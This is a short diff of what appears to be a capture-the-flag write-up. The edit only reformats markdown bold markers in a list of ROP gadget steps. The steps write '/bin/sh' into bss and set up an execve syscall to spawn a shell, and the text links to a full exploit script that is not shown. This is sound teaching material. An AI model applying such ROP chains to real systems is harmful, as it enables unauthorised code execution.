@@ -62,13 +62,13 @@ I used these ROP gadgets:
 0x00000000004012d3 : syscall
 ```
 
-- pop rax  ** "/bin/sh" **
-- pop rsi  ** (address of bss) **
-- mov qword ptr [rsi], rax ** so the starting address of bss contains the /bin/sh **
-- pop rax,0x3b ** execve syscall **
-- pop rdi ** bss (pointer to "/bin/sh") **
-- pop rsi ** 0 **
-- pop rdx ** 0 **
+- pop rax  **"/bin/sh"**
+- pop rsi  **(address of bss)**
+- mov qword ptr [rsi], rax **so the starting address of bss contains the /bin/sh**
+- pop rax,0x3b **execve syscall**
+- pop rdi **bss (pointer to "/bin/sh")**
+- pop rsi **0**
+- pop rdx **0**
 - syscall
 
 Here is the full [Exploit](./exploit.py) 
